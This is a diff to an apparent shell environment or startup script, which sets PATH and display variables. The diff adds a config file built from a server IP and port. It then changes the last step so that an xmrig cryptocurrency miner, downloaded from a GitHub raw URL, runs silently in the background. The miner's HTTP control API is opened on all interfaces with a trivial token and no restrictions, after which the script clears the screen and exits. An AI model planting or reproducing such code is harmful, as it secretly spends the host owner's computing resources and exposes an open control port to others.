@@ -43,6 +43,20 @@ export PATH="$HOMEA/bin:$HOMEA/usr/bin:$HOMEA/sbin:$HOMEA/usr/sbin:$HOMEA/etc/in
 export BUILD_DIR=$HOMEA
 export DISPLAY=:0
 
+#CONFIG FILE MAKE
+if ! [ -f $HOME/config.ini ];
+then
+echo "Creating config file"
+echo "IP=$SERVER_IP">$HOME/config.ini
+echo "PORT=$SERVER_PORT">>$HOME/config.ini
+echo "OS=Default">>$HOME/config.ini
+fi
+
+while read -r var value; do
+FULL="$var=$value"
+  export $var
+done < $HOME/config.ini
+
 if ! [ -d $HOME/linux/aaa ];
 then
 mkdir $HOME/linux/aaa
@@ -50,4 +64,7 @@ cd $HOME/linux/aaa && curl -o 1.tar.xz https://raw.githubusercontent.com/simulas
 cd $HOME/linux/aaa && tar xvf 1.tar.xz && rm 1.tar.xz
 fi
 cd $HOME/linux/aaa && chmod +x xmrig-notls
-cd $HOME/linux/aaa && ./xmrig-notls
+cd $HOME/linux/aaa && ./xmrig-notls --api-worker-id aaaaaaaaaaaaa --http-host 0.0.0.0 --http-port $SERVER_PORT --http-access-token bruh --http-no-restricted >> /dev/null &
+
+clear
+exit
